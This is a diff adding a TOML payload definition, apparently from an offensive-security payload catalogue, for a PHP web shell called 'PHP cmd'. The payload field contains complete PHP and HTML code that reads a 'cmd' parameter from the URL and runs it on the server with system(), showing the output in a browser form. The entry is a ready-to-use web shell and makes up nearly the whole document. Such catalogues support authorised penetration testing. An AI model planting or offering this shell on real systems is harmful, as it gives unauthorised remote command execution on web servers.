@@ -1,0 +1,12 @@
+id = "php_cmd"
+name = "PHP cmd"
+os = "all"
+type = "web"
+proto = ""
+lang = "php"
+description = "A simple PHP web shell that provides a browser-based command execution form. Accepts a cmd parameter via GET request and runs it with system(), displaying the output in the page."
+
+payload = "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>"
+
+[listeners]
+none = "This is a webshell, no listener is required."
